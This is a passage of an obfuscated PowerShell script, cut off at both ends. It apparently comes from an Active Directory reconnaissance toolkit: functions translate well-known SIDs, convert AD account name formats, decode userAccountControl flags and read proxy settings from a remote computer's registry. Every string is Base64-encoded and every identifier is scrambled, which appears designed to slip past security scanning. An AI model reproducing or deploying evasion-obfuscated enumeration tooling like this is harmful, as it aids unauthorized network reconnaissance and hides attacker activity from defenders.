            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbAB1AHAA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAdwBvAHIAawA='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHQAYwBoAA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGEAYwB0AGkAdgBlAA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQA='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAZQByAHAAcgBpAHMAZQAgAEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbABsAGUAcgBzAA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAwAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAIABTAGUAbABmAA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAxAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGUAZAAgAFUAcwBlAHIAcwA='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAyAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdAByAGkAYwB0AGUAZAAgAEMAbwBkAGUA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAzAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABlAHIAbQBpAG4AYQBsACAAUwBlAHIAdgBlAHIAIABVAHMAZQByAHMA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA0AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABJAG4AdABlAHIAYQBjAHQAaQB2AGUAIABMAG8AZwBvAG4A'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA1AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA3AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA4AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAUwB5AHMAdABlAG0A'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA5AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAwAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOAAwAC0AMAA=')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAIABTAGUAcgB2AGkAYwBlAHMAIAA='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwA='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFUAcwBlAHIAcwA='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEcAdQBlAHMAdABzAA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAbwB3AGUAcgAgAFUAcwBlAHIAcwA='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAG8AdQBuAHQAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFMAZQByAHYAZQByACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAcgBpAG4AdAAgAE8AcABlAHIAYQB0AG8AcgBzAA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADEA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEIAYQBjAGsAdQBwACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADIA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIAZQBwAGwAaQBjAGEAdABvAHIAcwA='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAcgBlAC0AVwBpAG4AZABvAHcAcwAgADIAMAAwADAAIABDAG8AbQBwAGEAdABpAGIAbABlACAAQQBjAGMAZQBzAHMA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIAZQBtAG8AdABlACAARABlAHMAawB0AG8AcAAgAFUAcwBlAHIAcwA='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAE4AZQB0AHcAbwByAGsAIABDAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEkAbgBjAG8AbQBpAG4AZwAgAEYAbwByAGUAcwB0ACAAVAByAHUAcwB0ACAAQgB1AGkAbABkAGUAcgBzAA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAE0AbwBuAGkAdABvAHIAIABVAHMAZQByAHMA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAEwAbwBnACAAVQBzAGUAcgBzAA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFcAaQBuAGQAbwB3AHMAIABBAHUAdABoAG8AcgBpAHoAYQB0AGkAbwBuACAAQQBjAGMAZQBzAHMAIABHAHIAbwB1AHAA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADEA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAATABpAGMAZQBuAHMAZQAgAFMAZQByAHYAZQByAHMA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADIA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEQAaQBzAHQAcgBpAGIAdQB0AGUAZAAgAEMATwBNACAAVQBzAGUAcgBzAA=='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADMA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEUAdgBlAG4AdAAgAEwAbwBnACAAUgBlAGEAZABlAHIAcwA='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAFMAZQByAHYAaQBjAGUAIABEAEMATwBNACAAQQBjAGMAZQBzAHMA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAAUgBlAG0AbwB0AGUAIABBAGMAYwBlAHMAcwAgAFMAZQByAHYAZQByAHMA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAARQBuAGQAcABvAGkAbgB0ACAAUwBlAHIAdgBlAHIAcwA='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAATQBhAG4AYQBnAGUAbQBlAG4AdAAgAFMAZQByAHYAZQByAHMA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEgAeQBwAGUAcgAtAFYAIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMA'))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcwBzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA4ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcwBzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
            Default { 
                ${_/=\_/\_/\____/=\} = (New-Object System.Security.Principal.SecurityIdentifier(${/==\/===\/=\_/=\_}))
                ${_/=\_/\_/\____/=\}.Translate( [System.Security.Principal.NTAccount]).Value
            }
        }
    }
    catch {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAFMASQBEADoAIAAkAHsAXwBfAC8AXAAvAD0AXAAvAFwAXwAvAFwALwA9AD0APQA9AFwAfQA=')))
        ${__/\/=\/\_/\/====\}
    }
}
filter _/=\/\/==\/==\_/\/ {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        ${__/\/==\_/\___/\/\},
        [String]
        [ValidateSet("NT4","Simple","Canonical")]
        ${_/==\/\/=\/=\_/=\_},
        [String]
        [ValidateSet("NT4","Simple","Canonical")]
        ${___/=\/==\_/\__/==}
    )
    ${_/==\/==\/=\/===\} = @{
        'Canonical' = 2
        'NT4'       = 3
        'Simple'    = 5
    }
    if(-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AFQAeQBwAGUA')))]) {
        if( (${__/\/==\_/\___/\/\}.split('/')).Count -eq 2 ) {
            ${__/\/==\_/\___/\/\} = ${__/\/==\_/\___/\/\}.replace('/', '\')
        }
        if(${__/\/==\_/\___/\/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbAEEALQBaAGEALQB6AF0AKwBcAFwAWwBBAC0AWgBhAC0AegAgAF0AKwA=')))) {
            ${_/==\/\/=\/=\_/=\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUADQA')))
        }
        elseif(${__/\/==\_/\___/\/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbAEEALQBaAGEALQB6ACAAXQArAEAAWwBBAC0AWgBhAC0AegBcAC4AXQArAA==')))) {
            ${_/==\/\/=\/=\_/=\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAG0AcABsAGUA')))
        }
        elseif(${__/\/==\_/\___/\/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbAEEALQBaAGEALQB6AFwALgBdACsALwBbAEEALQBaAGEALQB6AF0AKwAvAFsAQQAtAFoAYQAtAHoALwAgAF0AKwA=')))) {
            ${_/==\/\/=\/=\_/=\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbwBuAGkAYwBhAGwA')))
        }
        else {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AIABuAG8AdAAgAGkAZABlAG4AdABpAGYAeQAgAEkAbgBUAHkAcABlACAAZgBvAHIAIAAkAHsAXwBfAC8AXAAvAD0APQBcAF8ALwBcAF8AXwBfAC8AXAAvAFwAfQA=')))
            return ${__/\/==\_/\___/\/\}
        }
    }
    elseif(${_/==\/\/=\/=\_/=\_} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUADQA')))) {
        ${__/\/==\_/\___/\/\} = ${__/\/==\_/\___/\/\}.replace('/', '\')
    }
    if(-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAVAB5AHAAZQA=')))]) {
        ${___/=\/==\_/\__/==} = Switch(${_/==\/\/=\/=\_/=\_}) {
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUADQA'))) {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbwBuAGkAYwBhAGwA')))}
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAG0AcABsAGUA'))) {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUADQA')))}
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbwBuAGkAYwBhAGwA'))) {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUADQA')))}
        }
    }
    $Domain = Switch(${_/==\/\/=\/=\_/=\_}) {
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUADQA'))) { ${__/\/==\_/\___/\/\}.split("\")[0] }
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAG0AcABsAGUA'))) { ${__/\/==\_/\___/\/\}.split("@")[1] }
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbwBuAGkAYwBhAGwA'))) { ${__/\/==\_/\___/\/\}.split("/")[0] }
    }
    function _/==\/\___/\/\/\__([__ComObject] ${_/=====\/=\___/==\}, [String] ${___/\__/======\__/}, ${_______/=\_/\/====}) {
        ${/=\_/\_____/\__/\} = ${_/=====\/=\___/==\}.GetType().InvokeMember(${___/\__/======\__/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUATQBlAHQAaABvAGQA'))), $Null, ${_/=====\/=\___/==\}, ${_______/=\_/\/====})
        if ( ${/=\_/\_____/\__/\} ) { ${/=\_/\_____/\__/\} }
    }
    function _/=\_/\/=\_/======([__ComObject] ${_/=====\/=\___/==\}, [String] ${_/==\/\_/=\_/=\/=\}, ${_______/=\_/\/====}) {
        [Void] ${_/=====\/=\___/==\}.GetType().InvokeMember(${_/==\/\_/=\_/=\/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, ${_/=====\/=\___/==\}, ${_______/=\_/\/====})
    }
    ${___/===\__/=\____} = New-Object -ComObject NameTranslate
    try {
        _/==\/\___/\/\/\__ ${___/===\__/=\____} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdAA='))) (1, $Domain)
    }
    catch [System.Management.Automation.MethodInvocationException] { 
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAdwBpAHQAaAAgAHQAcgBhAG4AcwBsAGEAdABlACAAaQBuAGkAdAAgAGkAbgAgAEMAbwBuAHYAZQByAHQALQBBAEQATgBhAG0AZQA6ACAAJABfAA==')))
    }
    _/=\_/\/=\_/====== ${___/===\__/=\____} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcwBlAFIAZQBmAGUAcgByAGEAbAA='))) (0x60)
    try {
        _/==\/\___/\/\/\__ ${___/===\__/=\____} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA'))) (${_/==\/==\/=\/===\}[${_/==\/\/=\/=\_/=\_}], ${__/\/==\_/\___/\/\})
        (_/==\/\___/\/\/\__ ${___/===\__/=\____} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))) (${_/==\/==\/=\/===\}[${___/=\/==\_/\__/==}]))
    }
    catch [System.Management.Automation.MethodInvocationException] {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAdwBpAHQAaAAgAHQAcgBhAG4AcwBsAGEAdABlACAAUwBlAHQALwBHAGUAdAAgAGkAbgAgAEMAbwBuAHYAZQByAHQALQBBAEQATgBhAG0AZQA6ACAAJABfAA==')))
    }
}
function _/===\/\_/=\/====\ {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        ${__/====\/\/===\_/\},
        [Switch]
        $ShowAll
    )
    begin {
        ${_/\____/=========} = New-Object System.Collections.Specialized.OrderedDictionary
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBDAFIASQBQAFQA'))), 1)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEMATwBVAE4AVABEAEkAUwBBAEIATABFAA=='))), 2)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABPAE0ARQBEAEkAUgBfAFIARQBRAFUASQBSAEUARAA='))), 8)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABPAEMASwBPAFUAVAA='))), 16)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAEQAXwBOAE8AVABSAEUAUQBEAA=='))), 32)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAEQAXwBDAEEATgBUAF8AQwBIAEEATgBHAEUA'))), 64)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBOAEMAUgBZAFAAVABFAEQAXwBUAEUAWABUAF8AUABXAEQAXwBBAEwATABPAFcARQBEAA=='))), 128)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABFAE0AUABfAEQAVQBQAEwASQBDAEEAVABFAF8AQQBDAEMATwBVAE4AVAA='))), 256)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFIATQBBAEwAXwBBAEMAQwBPAFUATgBUAA=='))), 512)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBOAFQARQBSAEQATwBNAEEASQBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAA='))), 2048)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBPAFIASwBTAFQAQQBUAEkATwBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAA='))), 4096)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAFIAVgBFAFIAXwBUAFIAVQBTAFQAXwBBAEMAQwBPAFUATgBUAA=='))), 8192)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAEUAWABQAEkAUgBFAF8AUABBAFMAUwBXAE8AUgBEAA=='))), 65536)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBOAFMAXwBMAE8ARwBPAE4AXwBBAEMAQwBPAFUATgBUAA=='))), 131072)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEEAUgBUAEMAQQBSAEQAXwBSAEUAUQBVAEkAUgBFAEQA'))), 262144)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARABfAEYATwBSAF8ARABFAEwARQBHAEEAVABJAE8ATgA='))), 524288)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwBEAEUATABFAEcAQQBUAEUARAA='))), 1048576)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAXwBEAEUAUwBfAEsARQBZAF8ATwBOAEwAWQA='))), 2097152)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAFIARQBRAF8AUABSAEUAQQBVAFQASAA='))), 4194304)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAE8AUgBEAF8ARQBYAFAASQBSAEUARAA='))), 8388608)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARABfAFQATwBfAEEAVQBUAEgAXwBGAE8AUgBfAEQARQBMAEUARwBBAFQASQBPAE4A'))), 16777216)
        ${_/\____/=========}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFIAVABJAEEATABfAFMARQBDAFIARQBUAFMAXwBBAEMAQwBPAFUATgBUAA=='))), 67108864)
    }
    process {
        ${_/====\___/=====\} = New-Object System.Collections.Specialized.OrderedDictionary
        if(${__/====\/\/===\_/\} -is [Int]) {
            ${/=\___/\/==\/=\_/} = ${__/====\/\/===\_/\}
        }
        elseif (${__/====\/\/===\_/\} -is [PSCustomObject]) {
            if(${__/====\/\/===\_/\}.useraccountcontrol) {
                ${/=\___/\/==\/=\_/} = ${__/====\/\/===\_/\}.useraccountcontrol
            }
        }
        else {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAG8AYgBqAGUAYwB0ACAAaQBuAHAAdQB0ACAAZgBvAHIAIAAtAFYAYQBsAHUAZQAgADoAIAAkAHsAXwBfAC8APQA9AD0APQBcAC8AXAAvAD0APQA9AFwAXwAvAFwAfQA=')))
            return $Null 
        }
        if($ShowAll) {
            foreach (${__/\/\_/\/\/==\/\} in ${_/\____/=========}.GetEnumerator()) {
                if( (${/=\___/\/==\/=\_/} -band ${__/\/\_/\/\/==\/\}.Value) -eq ${__/\/\_/\/\/==\/\}.Value) {
                    ${_/====\___/=====\}.Add(${__/\/\_/\/\/==\/\}.Name, "$(${__/\/\_/\/\/==\/\}.Value)+")
                }
                else {
                    ${_/====\___/=====\}.Add(${__/\/\_/\/\/==\/\}.Name, "$(${__/\/\_/\/\/==\/\}.Value)")
                }
            }
        }
        else {
            foreach (${__/\/\_/\/\/==\/\} in ${_/\____/=========}.GetEnumerator()) {
                if( (${/=\___/\/==\/=\_/} -band ${__/\/\_/\/\/==\/\}.Value) -eq ${__/\/\_/\/\/==\/\}.Value) {
                    ${_/====\___/=====\}.Add(${__/\/\_/\/\/==\/\}.Name, "$(${__/\/\_/\/\/==\/\}.Value)")
                }
            }
        }
        ${_/====\___/=====\}
    }
}
filter Get-Proxy {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $ENV:COMPUTERNAME
    )
    try {
        ${/==\_/\__/=\/\/\_} = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwB1AHIAcgBlAG4AdABVAHMAZQByAA=='))), $ComputerName)
        ${____/\_____/=\/==} = ${/==\_/\__/=\/\/\_}.OpenSubkey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwAXABNAGkAYwByAG8AcwBvAGYAdABcAFwAVwBpAG4AZABvAHcAcwBcAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAXABJAG4AdABlAHIAbgBlAHQAIABTAGUAdAB0AGkAbgBnAHMA'))))
        ${____/=\/\___/\_/\} = ${____/\_____/=\/==}.GetValue($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AFMAZQByAHYAZQByAA=='))))
